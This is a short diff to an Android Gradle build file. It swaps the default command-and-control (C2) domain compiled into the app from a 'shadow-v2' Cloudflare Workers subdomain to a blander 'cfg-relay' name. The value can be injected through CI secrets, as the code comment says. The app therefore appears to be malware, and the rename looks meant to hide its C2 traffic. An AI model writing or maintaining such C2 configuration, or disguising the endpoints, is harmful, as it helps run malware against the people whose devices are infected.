@@ -17,7 +17,7 @@ android {
 
         // C2 Domain injection: set via env var or GitHub Secret during CI.
         // Default: Cloudflare Workers free subdomain (branch deepseek/version2)
-        buildConfigField("String", "C2_DOMAIN", "\"${System.getenv("C2_DOMAIN") ?: "shadow-v2.marwannaili-23-07.workers.dev"}\"")
+        buildConfigField("String", "C2_DOMAIN", "\"${System.getenv("C2_DOMAIN") ?: "cfg-relay.marwannaili-23-07.workers.dev"}\"")
     }
 
     signingConfigs {
